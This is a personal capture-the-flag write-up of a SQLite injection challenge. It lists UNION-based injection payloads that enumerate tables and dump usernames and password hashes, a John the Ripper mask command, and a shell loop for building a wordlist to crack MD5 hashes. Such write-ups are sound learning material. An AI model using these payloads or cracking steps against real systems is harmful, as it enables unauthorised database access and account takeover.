### This is a very cool challenge, I didn't solve it (nearly), but, nah, just write down to remember stuff
This is a SQLite injection, how do I know it was SQLite, well fuzzing and sqlmap

So the syntax of the payload is the same but the way to extract is different:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

With this I get the table name is users:
%22 UNION SELECT tbl_name,2 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -

And with this I get the column name:
%22 UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='users' -- -
```
CREATE TABLE users (
	username text primary key not null,
	password_hash text not null,
	hint text not null,
	bio text not null)
  ```
  From this just normal payload:
  %22 UNION SELECT username,password_hash FROM users -- -
  So what I encounter is a bunch of md5 hash with rules
  <img src="https://github.com/phulelouch/WRITE_UP/blob/master/SQL_Injection/login_page.png">
  <img src="https://github.com/phulelouch/WRITE_UP/blob/master/SQL_Injection/login_page.png">
 With that it mean we have to crack it with its rule
 - The easiest was the noob password, just google it and login 
 - Then come to the phone number, using john the ripper with mask for rule:
 	john --format=raw-md5 flag2.txt --mask=?d?d?d-?d?d?d-?d?d?d?d --fork=12
 - Next it would be Greek God + My least favorite US, so what I did was listing out some of the most popular Greek Gods and concat it with script, and just bruteforce it (faster)
 ```
 while read line; do
	while read liness; do
		echo $line$liness | tr -d ' ' 
	done < "/home/phulelouch/Desktop/US.txt"
done < "/home/phulelouch/Desktop/god.txt"
 ```
- The next one is harder, with 12 digit numbers and md5 hash, I have to create a file list of that number in md5 hash and using them as list for John
- The final one I can not solve but it is interesting: I follow 2 article
https://blog.bitcrack.net/2013/09/cracking-hashes-with-other-language.html
https://vxempire.xyz/repo/Hash%20Crack.pdf

So 4 parts combie the result would be like this uiuctf{Dump_4nd_unh45h_637_d4t_
